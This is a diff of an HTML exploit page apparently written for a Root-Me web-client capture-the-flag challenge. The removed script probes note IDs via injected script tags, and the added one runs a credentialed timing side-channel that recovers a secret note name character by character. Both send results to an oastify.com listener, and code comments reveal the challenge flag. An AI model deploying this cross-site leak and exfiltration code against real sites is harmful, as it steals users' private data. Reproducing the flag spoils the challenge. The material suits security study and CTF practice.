@@ -1,84 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title></title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title></title>
 </head>
 <body>
-<script>
-const listener   = 'https://d3hf8gt505zvmoc493wglh73wu2lqbe0.oastify.com';
-const target     = 'https://web-client-ch56.challenge01.root-me.org:58056/notes';
-const START_ID   = 1;
-const END_ID     = 4000;
-const BATCH_SIZE = 8;        // concurrent probes
-const DELAY_MS   = 150;      // throttle between batches
-const PROGRESS   = 500;      // beacon progress every N IDs
+<script type="text/javascript">
+// first step : zc4r3_4b0ut
+// second step : zc4r3_4b0ut_+s4mes1t3_
+// flag : zc4r3_4b0ut_%252bs4mes1t3_c00k13 = zc4r3_4b0ut_+s4mes1t3_c00k13
+var base_url = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/392/zc4r3_4b0ut_%2bs4mes1t3_';
+var listener = 'http://d3hf8gt505zvmoc493wglh73wu2lqbe0.oastify.com/';
 
-const found = [];
-let processed = 0;
-const scanStart = Date.now();
+async function prepare_url(url) {
+        var note_url = '';
+        var start, time;
+        var final_note = '';
+        var stop = false;
 
-function beacon(type, data) {
-    const p = new URLSearchParams({ type, t: Date.now(), ...data });
-    fetch(`${listener}/?${p}`, { method: 'GET', mode: 'no-cors' }).catch(()=>{});
-}
-
-function probe(id) {
-    return new Promise((resolve) => {
-        const s = document.createElement('script');
-        let done = false;
-        const finish = () => {
-            if (done) return;
-            done = true;
-            s.remove();
-            resolve();
-        };
-        
-        s.src = `${target}/${id}`;
-        s.onload = () => {
-            found.push(id);
-            beacon('HIT', { id });
-            finish();
-        };
-        s.onerror = finish;
-        setTimeout(finish, 4000); // kill hung requests
-        
-        document.head.appendChild(s);
-    });
-}
-
-async function run() {
-    beacon('START', { range: `${START_ID}-${END_ID}`, ts: scanStart });
-    
-    const ids = Array.from({length: END_ID - START_ID + 1}, (_,i) => START_ID + i);
-    
-    while (ids.length) {
-        const batch = ids.splice(0, BATCH_SIZE);
-        await Promise.all(batch.map(probe));
-        
-        processed += batch.length;
-        
-        if (processed % PROGRESS === 0 || !ids.length) {
-            beacon('PROGRESS', { 
-                done: processed, 
-                total: END_ID, 
-                hits: found.length,
-                hits_ids: found.join(',') || 'none'
-            });
+        // I put `f` character at the end because there is a `fake_flag` and I don't really want to fetch it.
+        for (let char of "abcdeghijklmnopqrstuvwxyz0123456789#@!$%^&*()+=~-_./,`f") {
+                if (stop) {
+                        break;
+                }
+                note_url = url + encodeURIComponent(char);
+                // Start the clock
+                start = performance.now();
+                await fetch(note_url, {"credentials": "include", "method": "GET", "mode": "no-cors"}).then(() => {
+                        // When fetch finishes, calculate the difference
+                        time = performance.now() - start;
+                        if (time > 2000) {
+                                final_note = note_url;
+                                stop = true;
+                        }
+                });
         }
-        
-        if (ids.length) await new Promise(r => setTimeout(r, DELAY_MS));
-    }
-    
-    beacon('END', {
-        duration: Date.now() - scanStart,
-        total_hits: found.length,
-        hits: found.join(',') || 'none'
-    });
+        if (final_note == '') {
+                // if it doesn't find anything, it returns `FINISHED` then return.
+                await fetch(listener + '/?note=FINISHED', {"method": "GET", "mode": "no-cors"});
+                return;
+        }
+        // if it finds the proper character, it returns the character after applying urlencode
+        await fetch(listener + '/?note=' + encodeURIComponent(final_note.split('/').pop()), {"method": "GET", "mode": "no-cors"});
+        // recursive function call to find next character
+        prepare_url(final_note);
 }
 
-run();
+prepare_url(base_url);
+
 </script>
 </body>
 </html>
